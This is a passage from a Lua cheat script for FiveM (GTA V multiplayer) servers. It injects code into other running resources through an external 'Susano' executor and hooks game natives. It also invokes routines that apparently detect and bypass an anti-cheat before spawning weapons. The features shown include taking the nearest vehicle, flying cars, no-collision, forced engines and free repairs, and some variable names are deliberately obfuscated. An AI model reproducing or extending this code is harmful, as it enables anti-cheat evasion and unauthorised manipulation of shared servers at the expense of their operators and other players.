                hNative("SetVehicleDoorsLockedForAllPlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleOnGroundProperly", function(originalFn, ...) return originalFn(...) end)

                CreateThread(function()
                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local myHeading = GetEntityHeading(playerPed)

                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then
                        return
                    end

                    ClearPedTasksImmediately(playerPed)
                    SetVehicleDoorsLocked(closestVeh, 1)
                    SetVehicleDoorsLockedForAllPlayers(closestVeh, false)

                    if IsVehicleSeatFree(closestVeh, -1) then
                        SetPedIntoVehicle(playerPed, closestVeh, -1)
                    end

                    Wait(150)

                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if NetworkGetEntityIsNetworked(closestVeh) then
                        NetworkRequestControlOfEntity(closestVeh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                            NetworkRequestControlOfEntity(closestVeh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end

                    if not IsPedInVehicle(playerPed, closestVeh, false) then
                        return
                    end

                    SetEntityCoordsNoOffset(closestVeh, myCoords.x, myCoords.y, myCoords.z + 1.0, false, false, false)
                    SetEntityHeading(closestVeh, myHeading)
                    SetVehicleOnGroundProperly(closestVeh)
                end)
            ]])
        else
        Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
            if not closestVeh or closestVeh == 0 then
                return
            end

            ClearPedTasksImmediately(playerPed)
            SetVehicleDoorsLocked(closestVeh, 1)
            SetVehicleDoorsLockedForAllPlayers(closestVeh, false)

            if IsVehicleSeatFree(closestVeh, -1) then
                SetPedIntoVehicle(playerPed, closestVeh, -1)
            end

            Citizen.Wait(150)

            SetEntityAsMissionEntity(closestVeh, true, true)
            if NetworkGetEntityIsNetworked(closestVeh) then
                NetworkRequestControlOfEntity(closestVeh)
                local timeout = 0
                while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                    NetworkRequestControlOfEntity(closestVeh)
                    Citizen.Wait(10)
                    timeout = timeout + 1
                end
            end

            if not IsPedInVehicle(playerPed, closestVeh, false) then
                return
            end

            SetEntityCoordsNoOffset(closestVeh, myCoords.x, myCoords.y, myCoords.z + 1.0, false, false, false)
            SetEntityHeading(closestVeh, myHeading)
            SetVehicleOnGroundProperly(closestVeh)
        end)
        end
    end,

    easyhandling = function()
        vortex_easyhandlingEnabled = not vortex_easyhandlingEnabled

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleHandlingFloat", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleHandlingInt", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleHandlingBool", function(originalFn, ...) return originalFn(...) end)

                if not _G.vortex_easyhandlingEnabled then
                    _G.vortex_easyhandlingEnabled = false
                end
                _G.vortex_easyhandlingEnabled = %s

                if not _G.vortex_easyhandlingEnabled then
                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            SetVehicleGravityAmount(veh, 9.8)
                            SetVehicleStrong(veh, false)
                        end
                    end
                else
                    CreateThread(function()
                        while _G.vortex_easyhandlingEnabled do
                            Wait(0)
                            local ped = PlayerPedId()
                            if IsPedInAnyVehicle(ped, false) then
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 then
                                    SetVehicleGravityAmount(veh, 0.1)
                                    SetVehicleStrong(veh, true)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 0.1)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fDownforceModifier", 0.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 2.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 2.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveLateral", 22.5)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fLowSpeedTractionLossMult", 0.0)
                                end
                            end
                        end
                    end)
                end
            ]], tostring(vortex_easyhandlingEnabled)))
        else
        if not vortex_easyhandlingEnabled then
            local ped = PlayerPedId()
            if IsPedInAnyVehicle(ped, false) then
                local veh = GetVehiclePedIsIn(ped, false)
                if veh and veh ~= 0 then
                    SetVehicleGravityAmount(veh, 9.8)
                    SetVehicleStrong(veh, false)
                end
            end
        end
        end
    end,

    weapon_melee = function()
        local targetResource = Vortex_DetectAnvilAC()
        if targetResource then
            Vortex_ProtectAnvilAC(targetResource)
            Wait(500)
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local weaponList = vortex_weaponLists.melee
            local index = vortex_selectedWeaponIndex.melee
            if weaponList and weaponList[index] then
                local weaponName = weaponList[index].name
                Susano.InjectResource("any", string.format([[
                    CreateThread(function()
                        Wait(300)
                        local ped = PlayerPedId()
                        local weaponHash = GetHashKey("%s")
                        RequestWeaponAsset(weaponHash, 31, 0)
                        local timeout = 0
                        while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        if HasWeaponAssetLoaded(weaponHash) then
                            Wait(100)
                            GiveWeaponToPed(ped, weaponHash, 250, false, true)
                        end
                    end)
                ]], weaponName))
            end
        else
            Citizen.CreateThread(function()
                local weaponList = vortex_weaponLists.melee
                local index = vortex_selectedWeaponIndex.melee
                if weaponList and weaponList[index] then
                    local weaponName = weaponList[index].name
                    local ped = PlayerPedId()
                    local weaponHash = GetHashKey(weaponName)
                    if not HasPedGotWeapon(ped, weaponHash, false) then
                        RequestWeaponAsset(weaponHash, 31, 0)
                        local timeout = 0
                        while not HasWeaponAssetLoaded(weaponHash) and timeout < 50 do
                            Citizen.Wait(10)
                            timeout = timeout + 1
                        end
                        GiveWeaponToPed(ped, weaponHash, 250, false, true)
                    end
            end
        end)
        end
    end,

    weapon_pistol = function()
        local targetResource = Vortex_DetectAnvilAC()
        if targetResource then
            Vortex_ProtectAnvilAC(targetResource)
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local weaponList = vortex_weaponLists.pistol
            local index = vortex_selectedWeaponIndex.pistol
            if weaponList and weaponList[index] then
                local weaponName = weaponList[index].name
                Susano.InjectResource("any", string.format([[
                    CreateThread(function()
                        Wait(300)
                        local ped = PlayerPedId()
                        local weaponHash = GetHashKey("%s")
                        RequestWeaponAsset(weaponHash, 31, 0)
                        local timeout = 0
                        while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        if HasWeaponAssetLoaded(weaponHash) then
                            Wait(100)
                            GiveWeaponToPed(ped, weaponHash, 250, false, true)
                        end
                    end)
                ]], weaponName))
            end
        else
        Citizen.CreateThread(function()
            local ped = PlayerPedId()
            local weaponList = vortex_weaponLists.pistol
            local index = vortex_selectedWeaponIndex.pistol
            if weaponList and weaponList[index] then
                local weaponHash = GetHashKey(weaponList[index].name)
                if not HasPedGotWeapon(ped, weaponHash, false) then
                    RequestWeaponAsset(weaponHash, 31, 0)
                    local timeout = 0
                    while not HasWeaponAssetLoaded(weaponHash) and timeout < 50 do
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                    GiveWeaponToPed(ped, weaponHash, 250, false, true)
                end
            end
        end)
        end
    end,

    weapon_smg = function()
        local targetResource = Vortex_DetectAnvilAC()
        if targetResource then
            Vortex_ProtectAnvilAC(targetResource)
            Wait(500)
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local weaponList = vortex_weaponLists.smg
            local index = vortex_selectedWeaponIndex.smg
            if weaponList and weaponList[index] then
                local weaponName = weaponList[index].name
                Susano.InjectResource("any", string.format([[
                    CreateThread(function()
                        Wait(300)
                        local ped = PlayerPedId()
                        local weaponHash = GetHashKey("%s")
                        RequestWeaponAsset(weaponHash, 31, 0)
                        local timeout = 0
                        while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        if HasWeaponAssetLoaded(weaponHash) then
                            Wait(100)
                            GiveWeaponToPed(ped, weaponHash, 250, false, true)
                        end
                    end)
                ]], weaponName))
            end
        else
        Citizen.CreateThread(function()
            local ped = PlayerPedId()
            local weaponList = vortex_weaponLists.smg
            local index = vortex_selectedWeaponIndex.smg
            if weaponList and weaponList[index] then
                local weaponHash = GetHashKey(weaponList[index].name)
                if not HasPedGotWeapon(ped, weaponHash, false) then
                    RequestWeaponAsset(weaponHash, 31, 0)
                    local timeout = 0
                    while not HasWeaponAssetLoaded(weaponHash) and timeout < 50 do
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                    GiveWeaponToPed(ped, weaponHash, 250, false, true)
                end
            end
        end)
        end
    end,

    weapon_shotgun = function()
        local targetResource = Vortex_DetectAnvilAC()
        if targetResource then
            Vortex_ProtectAnvilAC(targetResource)
            Wait(500)
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local weaponList = vortex_weaponLists.shotgun
            local index = vortex_selectedWeaponIndex.shotgun
            if weaponList and weaponList[index] then
                local weaponName = weaponList[index].name
                Susano.InjectResource("any", string.format([[
                    CreateThread(function()
                        Wait(300)
                        local ped = PlayerPedId()
                        local weaponHash = GetHashKey("%s")
                        RequestWeaponAsset(weaponHash, 31, 0)
                        local timeout = 0
                        while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        if HasWeaponAssetLoaded(weaponHash) then
                            Wait(100)
                            GiveWeaponToPed(ped, weaponHash, 250, false, true)
                        end
                    end)
                ]], weaponName))
            end
        else
        Citizen.CreateThread(function()
            local ped = PlayerPedId()
            local weaponList = vortex_weaponLists.shotgun
            local index = vortex_selectedWeaponIndex.shotgun
            if weaponList and weaponList[index] then
                local weaponHash = GetHashKey(weaponList[index].name)
                if not HasPedGotWeapon(ped, weaponHash, false) then
                    RequestWeaponAsset(weaponHash, 31, 0)
                    local timeout = 0
                    while not HasWeaponAssetLoaded(weaponHash) and timeout < 50 do
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                    GiveWeaponToPed(ped, weaponHash, 250, false, true)
                end
            end
        end)
        end
    end,

    weapon_ar = function()
        local targetResource = Vortex_DetectAnvilAC()
        if targetResource then
            Vortex_ProtectAnvilAC(targetResource)
            Wait(500)
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local weaponList = vortex_weaponLists.ar
            local index = vortex_selectedWeaponIndex.ar
            if weaponList and weaponList[index] then
                local weaponName = weaponList[index].name
                Susano.InjectResource("any", string.format([[
                    CreateThread(function()
                        Wait(300)
                        local ped = PlayerPedId()
                        local weaponHash = GetHashKey("%s")
                        RequestWeaponAsset(weaponHash, 31, 0)
                        local timeout = 0
                        while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        if HasWeaponAssetLoaded(weaponHash) then
                            Wait(100)
                            GiveWeaponToPed(ped, weaponHash, 250, false, true)
                        end
                    end)
                ]], weaponName))
            end
        else
        Citizen.CreateThread(function()
            local ped = PlayerPedId()
            local weaponList = vortex_weaponLists.ar
            local index = vortex_selectedWeaponIndex.ar
            if weaponList and weaponList[index] then
                local weaponHash = GetHashKey(weaponList[index].name)
                if not HasPedGotWeapon(ped, weaponHash, false) then
                    RequestWeaponAsset(weaponHash, 31, 0)
                    local timeout = 0
                    while not HasWeaponAssetLoaded(weaponHash) and timeout < 50 do
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                    GiveWeaponToPed(ped, weaponHash, 250, false, true)
                end
            end
        end)
        end
    end,

    weapon_sniper = function()
        local targetResource = Vortex_DetectAnvilAC()
        if targetResource then
            Vortex_ProtectAnvilAC(targetResource)
            Wait(500)
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local weaponList = vortex_weaponLists.sniper
            local index = vortex_selectedWeaponIndex.sniper
            if weaponList and weaponList[index] then
                local weaponName = weaponList[index].name
                Susano.InjectResource("any", string.format([[
                    CreateThread(function()
                        Wait(300)
                        local ped = PlayerPedId()
                        local weaponHash = GetHashKey("%s")
                        RequestWeaponAsset(weaponHash, 31, 0)
                        local timeout = 0
                        while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        if HasWeaponAssetLoaded(weaponHash) then
                            Wait(100)
                            GiveWeaponToPed(ped, weaponHash, 250, false, true)
                        end
                    end)
                ]], weaponName))
            end
        else
        Citizen.CreateThread(function()
            local ped = PlayerPedId()
            local weaponList = vortex_weaponLists.sniper
            local index = vortex_selectedWeaponIndex.sniper
            if weaponList and weaponList[index] then
                local weaponHash = GetHashKey(weaponList[index].name)
                if not HasPedGotWeapon(ped, weaponHash, false) then
                    RequestWeaponAsset(weaponHash, 31, 0)
                    local timeout = 0
                    while not HasWeaponAssetLoaded(weaponHash) and timeout < 50 do
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                    GiveWeaponToPed(ped, weaponHash, 250, false, true)
                end
            end
        end)
        end
    end,

    weapon_heavy = function()
        local targetResource = Vortex_DetectAnvilAC()
        if targetResource then
            Vortex_ProtectAnvilAC(targetResource)
            Wait(500)
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local weaponList = vortex_weaponLists.heavy
            local index = vortex_selectedWeaponIndex.heavy
            if weaponList and weaponList[index] then
                local weaponName = weaponList[index].name
                Susano.InjectResource("any", string.format([[
                    CreateThread(function()
                        Wait(300)
                        local ped = PlayerPedId()
                        local weaponHash = GetHashKey("%s")
                        RequestWeaponAsset(weaponHash, 31, 0)
                        local timeout = 0
                        while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        if HasWeaponAssetLoaded(weaponHash) then
                            Wait(100)
                            GiveWeaponToPed(ped, weaponHash, 250, false, true)
                        end
                    end)
                ]], weaponName))
            end
        else
        Citizen.CreateThread(function()
            local ped = PlayerPedId()
            local weaponList = vortex_weaponLists.heavy
            local index = vortex_selectedWeaponIndex.heavy
            if weaponList and weaponList[index] then
                local weaponHash = GetHashKey(weaponList[index].name)
                if not HasPedGotWeapon(ped, weaponHash, false) then
                    RequestWeaponAsset(weaponHash, 31, 0)
                    local timeout = 0
                    while not HasWeaponAssetLoaded(weaponHash) and timeout < 50 do
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                    GiveWeaponToPed(ped, weaponHash, 250, false, true)
                end
            end
        end)
        end
    end,

    gravitatevehicle = function()
        vortex_gravitatevehicleEnabled = not vortex_gravitatevehicleEnabled

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVelocity", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)

                if not _G.vortex_gravitatevehicleEnabled then
                    _G.vortex_gravitatevehicleEnabled = false
                end
                if not _G.Vortex_VehicleSpeed then
                    _G.Vortex_VehicleSpeed = 0.0
                end
                if not _G.Vortex_VehicleMaxSpeed then
                    _G.Vortex_VehicleMaxSpeed = 50.0
                end
                if not _G.Vortex_VehicleSpeedMultiplier then
                    _G.Vortex_VehicleSpeedMultiplier = 5.0
                end

                _G.vortex_gravitatevehicleEnabled = %s

                if _G.vortex_gravitatevehicleEnabled then
                    _G.Vortex_VehicleSpeed = 0.0
                    _G.Vortex_VehicleMaxSpeed = 50.0
                    _G.Vortex_VehicleSpeedMultiplier = 5.0

                    CreateThread(function()
                        while _G.vortex_gravitatevehicleEnabled do
                            Wait(0)
                            local ped = PlayerPedId()
                            local vehicle = GetVehiclePedIsIn(ped, false)
                            if vehicle and vehicle ~= 0 then
                                SetVehicleGravityAmount(vehicle, 0.1)
                                FreezeEntityPosition(vehicle, true)

                                local coords = GetEntityCoords(vehicle)
                                local heading = GetEntityHeading(vehicle)

                                local forwardX = GetDisabledControlNormal(0, 32)
                                local forwardY = GetDisabledControlNormal(0, 33)
                                local up = GetDisabledControlNormal(0, 22)
                                local down = GetDisabledControlNormal(0, 36)

                                local speed = _G.Vortex_VehicleSpeed
                                if forwardX ~= 0.0 or forwardY ~= 0.0 then
                                    speed = math.min(speed + 0.5, _G.Vortex_VehicleMaxSpeed)
                                elseif up ~= 0.0 then
                                    speed = math.min(speed + 0.5, _G.Vortex_VehicleMaxSpeed)
                                elseif down ~= 0.0 then
                                    speed = math.max(speed - 0.5, 0.0)
                                else
                                    speed = math.max(speed - 0.2, 0.0)
                                end

                                _G.Vortex_VehicleSpeed = speed

                                local rad = math.rad(heading)
                                local newX = coords.x + (math.sin(-rad) * forwardX * speed * _G.Vortex_VehicleSpeedMultiplier * 0.01)
                                local newY = coords.y + (math.cos(-rad) * forwardX * speed * _G.Vortex_VehicleSpeedMultiplier * 0.01)
                                local newZ = coords.z + ((up - down) * speed * _G.Vortex_VehicleSpeedMultiplier * 0.01)

                                SetEntityCoordsNoOffset(vehicle, newX, newY, newZ, false, false, false)
                            end
                        end
                    end)
                else
                    local ped = PlayerPedId()
                    local vehicle = GetVehiclePedIsIn(ped, false)
                    if vehicle and vehicle ~= 0 then
                        SetVehicleGravityAmount(vehicle, 9.8)
                        if IsEntityPositionFrozen(vehicle) then
                            FreezeEntityPosition(vehicle, false)
                        end
                        SetEntityVelocity(vehicle, 0.0, 0.0, 0.0)
                    end
                    _G.Vortex_VehicleSpeed = 0.0
                    _G.Vortex_VehicleMaxSpeed = 100.0
                end
            ]], tostring(vortex_gravitatevehicleEnabled)))
        else
        if vortex_gravitatevehicleEnabled then
            Vortex_VehicleSpeed = 0.0
                Vortex_VehicleMaxSpeed = 50.0
            Vortex_VehicleSpeedMultiplier = 5.0
        else
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)
            if vehicle and vehicle ~= 0 then
                SetVehicleGravityAmount(vehicle, 9.8)
                if IsEntityPositionFrozen(vehicle) then
                    FreezeEntityPosition(vehicle, false)
                end
                SetEntityVelocity(vehicle, 0.0, 0.0, 0.0)
            end
            Vortex_VehicleSpeed = 0.0
            Vortex_VehicleMaxSpeed = 100.0
            end
        end
    end,

    nocolision = function()
        vortex_nocolisionEnabled = not vortex_nocolisionEnabled

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityNoCollisionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)

                if not _G.no_vehicle_collision_active then
                    _G.no_vehicle_collision_active = false
                end
                _G.no_vehicle_collision_active = %s

                if _G.no_vehicle_collision_active then
                    CreateThread(function()
                        while _G.no_vehicle_collision_active do
                            Wait(0)

                            local ped = PlayerPedId()
                            if IsPedInAnyVehicle(ped, false) then
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 then
                                    SetEntityNoCollisionEntity(veh, veh, false)

                                    local myCoords = GetEntityCoords(veh)
                                    local vehHandle, otherVeh = FindFirstVehicle()
                                    local success

                                    repeat
                                        if otherVeh ~= veh and DoesEntityExist(otherVeh) then
                                            local otherCoords = GetEntityCoords(otherVeh)
                                            local distance = #(myCoords - otherCoords)

                                            if distance < 50.0 then
                                                SetEntityNoCollisionEntity(veh, otherVeh, true)
                                                SetEntityNoCollisionEntity(otherVeh, veh, true)
                                            end
                                        end

                                        success, otherVeh = FindNextVehicle(vehHandle)
                                    until not success

                                    EndFindVehicle(vehHandle)
                                end
                            end
                        end
                    end)
                end
            ]], tostring(vortex_nocolisionEnabled)))
        else
        if vortex_nocolisionEnabled then
            rawset(_G, 'no_vehicle_collision_active', true)

            Citizen.CreateThread(function()
                while rawget(_G, 'no_vehicle_collision_active') do
                    Citizen.Wait(0)

                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            SetEntityNoCollisionEntity(veh, veh, false)

                            local myCoords = GetEntityCoords(veh)
                            local vehHandle, otherVeh = FindFirstVehicle()
                            local success

                            repeat
                                if otherVeh ~= veh and DoesEntityExist(otherVeh) then
                                    local otherCoords = GetEntityCoords(otherVeh)
                                    local distance = #(myCoords - otherCoords)

                                    if distance < 50.0 then
                                        SetEntityNoCollisionEntity(veh, otherVeh, true)
                                        SetEntityNoCollisionEntity(otherVeh, veh, true)
                                    end
                                end

                                success, otherVeh = FindNextVehicle(vehHandle)
                            until not success

                            EndFindVehicle(vehHandle)
                        end
                    end
                end
            end)
        else
            rawset(_G, 'no_vehicle_collision_active', false)
            end
        end
    end,

    repairvehicle = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleFixed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDeformationFixed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleBodyHealth", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehiclePetrolTankHealth", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)

                if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                    SetVehicleFixed(vehicle)
                    SetVehicleDeformationFixed(vehicle)
                    SetVehicleUndriveable(vehicle, false)
                    SetVehicleEngineOn(vehicle, true, true, true)
                    SetVehicleEngineHealth(vehicle, 1000.0)
                    SetVehicleBodyHealth(vehicle, 1000.0)
                    SetVehiclePetrolTankHealth(vehicle, 1000.0)
                    SetVehicleFuelLevel(vehicle, 100.0)
                end
            ]])
        end
    end,

    cleanvehicle = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDirtLevel", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local veh = GetVehiclePedIsIn(ped, false)
                if veh and veh ~= 0 then
                    SetVehicleDirtLevel(veh, 0.0)
                end
            ]])
        end
    end,

    forcevehicleengine = function()

        if not vortex_forceVehicleEngineEnabled then
            vortex_forceVehicleEngineEnabled = true
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
            return
        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                    hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                    hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleNeedsToBeHotwired", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                    if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                    GhYtReFdCxWaQzLp = true

                    local function OpAsDfGhJkLzXcVb()
                        local lMnbVcXzZaSdFg = CreateThread
                        lMnbVcXzZaSdFg(function()
                            local QwErTyUiOp         = _G.PlayerPedId
                            local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                            local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                            local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                            local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                            local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                            local En_g_Health_Get    = _G.GetVehicleEngineHealth
                            local En_g_Health_Set    = _G.SetVehicleEngineHealth
                            local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                            local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                            local function _tick(vh)
                                if vh and vh ~= 0 then
                                    No_Hotwire_Set(vh, false)
                                    En_g_Degrade_Set(vh, false)
                                    ErTyUiOpAsDfGh(vh, false)
                                    KeEpOnAb(vh, true)

                                    local eh = En_g_Health_Get(vh)
                                    if (not eh) or eh < 300.0 then
                                        En_g_Health_Set(vh, 900.0)
                                    end

                                    ZxCvBnMqWeRtYu(vh, true, true, true)
                                end
                            end

                            while GhYtReFdCxWaQzLp and not Unloaded do
                                local p  = QwErTyUiOp()

                                _tick(AsDfGhJkLz(p, false))
                                _tick(TyUiOpAsDfGh(p))
